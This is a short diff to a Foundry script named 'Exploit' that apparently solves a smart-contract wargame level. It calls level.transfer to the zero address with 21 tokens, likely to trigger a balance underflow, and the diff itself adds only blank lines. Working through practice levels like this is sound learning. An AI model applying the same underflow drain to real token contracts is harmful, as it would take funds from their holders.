@@ -12,7 +12,9 @@ contract Exploit is Script {
         function run() external {
 
             vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
             level.transfer(0x0000000000000000000000000000000000000000, 21);
+            
             vm.stopBroadcast();
     }
 }
